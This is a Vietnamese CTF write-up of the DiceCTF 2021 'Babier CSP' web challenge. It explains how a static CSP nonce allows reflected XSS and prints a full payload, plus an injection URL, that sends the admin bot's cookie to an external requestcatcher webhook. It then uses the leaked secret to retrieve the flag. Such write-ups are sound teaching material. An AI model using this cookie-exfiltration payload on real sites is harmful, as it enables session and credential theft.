---
title: DiceCTF 2021 | Web Writeup | Babier CSP
author:
  name: Antoine Hoang
  link: https://github.com/antoinenguyen-09
date: 2021-02-12 21:00:00 +0700
categories: [CTF, Web Challenges]
tags: [writeups, web, dicectf21]
mermaid: true
---

# BABIER CSP

## Thử thách:

- [Baby CSP](https://2020.justctf.team/challenges/14)  was too hard for us, try Babier CSP.

- [babier-csp.dicec.tf](https://babier-csp.dicec.tf/)

- [Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp)

- The admin will set a cookie  `secret`  equal to  `config.secret`  in index.js.

- Downloads ``index.js``

## Kiến thức nền:

- Content Security Policy (CSP).

- XSS (Cross-site scripting).

- Webhook (Reverse API).

## Giải quyết vấn đề:

### Initial reconnaissance:

Đề bài cho hai trang 1 là của client và 1 là của admin. Check thằng client trước xem sao:

![image](https://user-images.githubusercontent.com/61876488/107622961-36c3fd00-6c8b-11eb-8344-05a60fc4db10.png)

Bấm thử vào cái dòng "View Fruit" liên tục thì nó hiện ra tên các loại Fruit:v

![image](https://user-images.githubusercontent.com/61876488/107623162-80ace300-6c8b-11eb-998b-b69306aa4ab5.png)

CTRL + U rồi check source code xem:

```html
<html>
<a href='#' id=elem>View Fruit</a>
<script nonce=g+ojjmb9xLfE+3j9PsP/Ig==>
elem.onclick = () => {
location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>
</html>
```

Từ source code ta biết được trang web này sẽ random các loại Fruit bao gồm "apple", "orange", "pineapple", "pear" rồi hiển thị tên nó lên mỗi lần mình click vào dòng "View Fruit". Tên của các fruit này được truyền thông qua GET parameter "name". Thử inject một vài thứ gì đó vui vui xem nào. 

![image](https://user-images.githubusercontent.com/61876488/107624024-d46bfc00-6c8c-11eb-8ccc-7793e966d6e0.png)

Uầy!! Được luôn nè! Như vậy khả năng cao trang web này bị dính XSS rồi. Tiếp tục khai thác thôi.

### Bypassing CSP to exploiting XSS:

Vừa đúng lúc ngày hôm qua mới được học về XSS. Tuy nhiên khi check thử vài payload XSS mẫu như `<script> alert(1) </script>` (script hiện dòng cảnh báo có nội dung là "1" ở trên trang web ) thì không thấy gì cả. Check lại source code của trang web thì tôi phát hiện ra 1 điều đáng ngờ:

```html
<script nonce='g+ojjmb9xLfE+3j9PsP/Ig=='> ... </script>
```

Đây là thẻ script chứa câu lệnh để random các loại fruit rồi print ra. Thẻ này có một thuộc tính mà tôi chưa gặp bao giờ `nonce='g+ojjmb9xLfE+3j9PsP/Ig=='`. Thử research 1 chút thì tôi biết được ["nonce"](https://content-security-policy.com/nonce/) là một thuộc tính được quy định trong CSP ([Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)). Chỉ cần paste url vào [đây](https://csp-evaluator.withgoogle.com/) là chúng ta có thể đọc được toàn bộ CSP của trang web đó:

![image](https://user-images.githubusercontent.com/61876488/107743763-186e0800-6d44-11eb-814a-631d50616949.png)

Từ CSP check được ta kết luận rằng tất cả các thẻ trong HTML Document đều không bị "ruled" bởi CSP (vì directive [default-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) được set giá trị là "none"), chỉ có duy nhất thẻ script là bị "ruled" (vì [script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) được set giá trị là "nonce-g+ojjmb9xLfE+3j9PsP/Ig=="). Điều này có nghĩa là nếu muốn inject một thẻ script vào HTML Document của trang web này, ta phải kèm vào nó một thuộc tính nonce với giá trị là 'g+ojjmb9xLfE+3j9PsP/Ig=='. Download code javascript (NodeJS) "index.js" từ đề bài, tìm thấy dòng code set giá trị cho thuộc tính "nonce" này bằng phương thức [randombytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback): 

```javascript
const  NONCE = crypto.randomBytes(16).toString('base64');
```

Nhìn có vẻ như giá trị nonce này sẽ random liên tục và mỗi giá trị nonce sẽ chỉ xuất hiện 1 lần mỗi khi ta refresh lại trang (đúng theo quy tắc là thế). Nhưng bằng 1 cách magic nào đó, refresh cái trang này bao nhiêu lần nonce vẫn giữ nguyên giá trị là 'g+ojjmb9xLfE+3j9PsP/Ig=='??? Ngon quá, vậy là chỉ cần ốp nguyên cái thằng nonce này vào payload là xong hihi!

![image](https://user-images.githubusercontent.com/61876488/107749166-bb2a8480-6d4c-11eb-886e-cd13a7c47cf3.png)

Đã xong phần XSS payload. Như vậy chúng ta hoàn toàn có thể tấn công vào trang web này thông qua lỗ hổng Reflected XSS (các bạn có thể tham khảo về các vuln XSS tại [đây](https://ethical-h4ckers-club.blogspot.com/2020/10/xss-co-ban-cors-va-csp.html)). 

### Đánh cắp cookie từ trang admin:

Thông thường khi muốn đánh cắp cookie bằng XSS bạn cần host một server đóng vai trò là điểm cuối tiếp nhận request gửi đến từ trang của victim (do payload XSS đã làm thay đổi đường đi của ban đầu request, thay vì đến nơi cần đến, nó sẽ đến server do bạn host và bạn có thể tha hồ đọc nó!). Thật may mắn là tôi có tìm được một site khá tiện lợi mà đơn giản cho phép chúng ta tạo một [webhook](https://topdev.vn/blog/webhook-la-gi/) có tên là [requestcatcher](https://requestcatcher.com/). Chỉ cần gõ vài phát là bạn có ngay một cái webhook:D

![image](https://user-images.githubusercontent.com/61876488/107753501-bcf74680-6d52-11eb-89bf-18ca9ecabb71.png)

![image](https://user-images.githubusercontent.com/61876488/107753550-cda7bc80-6d52-11eb-96e9-88b683c4cb96.png)

Bây giờ chỉ cần viết lại payload dựa theo CSP đã quy định của trang web:

```html
</h1>  <!-- đóng thẻ h1 lại vì trong HTML có 1 thẻ <h1> (open) -->
<script  nonce='g+ojjmb9xLfE+3j9PsP/Ig=='>   <!-- mở thẻ script với giá trị nonce đã được quy định --> 
scrp_tag = document.createElement('script');  <!-- tạo đối tượng "thẻ script"mới tên là "scrp_tag" -->
scrp_tag.src = 'https://antoine.requestcatcher.com/? flag='.concat(JSON.stringify(document.cookie)); <!-- chỉnh attribute src của "scrp_tag" để request của admin bot được redirect đến webhook mà ta đã tạo và chứa trong đó tham số "flag" được gán bằng cookie của admin bot --> 
scrp_tag.nonce = 'g+ojjmb9xLfE+3j9PsP/Ig==' <!-- setup attribute nonce của "scrp_tag" cho phù hợp với CSP -->
contain_tag = document.querySelector("body"); <!-- tham chiếu đến thẻ body của HTML Document -->
contain_tag.appendChild(scrp_tag); <!-- thêm "scrp_tag" vào body của HTML Document để thực thi script -->
</script>
</h1>
```

Cuối cùng chúng nhúng cái payload này vào link babier-csp.dicec.tf (vì Admin chỉ evaluate một mình cái link này) bằng cách gán nó vào parameter name:

```
https://babier-csp.dicec.tf/?name=</h1><script nonce='g+ojjmb9xLfE+3j9PsP/Ig=='>scrp_tag = document.createElement('script'); scrp_tag.nonce = 'g+ojjmb9xLfE+3j9PsP/Ig=='; scrp_tag.src = 'https://antoine.requestcatcher.com/?xss='.concat(JSON.stringify(document.cookie)); contain_tag = document.querySelector("body"); contain_tag.appendChild(scrp_tag);</script></h1>
```

Well well well, hãy xem chúng ta có gì ở webhook `https://antoine.requestcatcher.com/` sau khi submit cái link đó ở Admin Bot:

![image](https://user-images.githubusercontent.com/61876488/107759051-5544f980-6d5a-11eb-8655-28f9603c037d.png)
 
Kết quả trả về ở tham số "flag" là một tham số khác có tên là "secret". Cái tên này nghe khá là quen, hình như mình gặp đâu đó rồi...Hmmm, đây rồi, ngay trong souce code "index.js":

```javascript
const  SECRET = config.secret;
 // to be continued...
app.use('/' + SECRET, express.static(__dirname + "/secret"));
```

Hằng SECRET được gán bằng "config.secret", có khả năng "config.secret" là tham số "secret". Đáng chú ý nhất là hàm [middleware](http://expressjs.com/en/guide/using-middleware.html#middleware.built-in) [express.static](https://expressjs.com/en/4x/api.html#express.static) - một hàm chuyên dùng để đọc và xử lý các nội dung tĩnh như file HTML, ảnh... Có thể tạm hiểu rằng sử dụng đường dẫn với token `4b36b1b8e47f761263796b1defd80745` trong request mà ta bắt được sẽ dẫn tới file "secret" của server:

`https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/`

Truy cập URL này ta thu được:

![image](https://user-images.githubusercontent.com/61876488/107773599-7adcfd80-6d70-11eb-8db4-00b3a14453a6.png)

Yolo!! CTRL + U rồi lấy flag thôi hehe:

> dice{web_1s_a_stat3_0f_grac3_857720}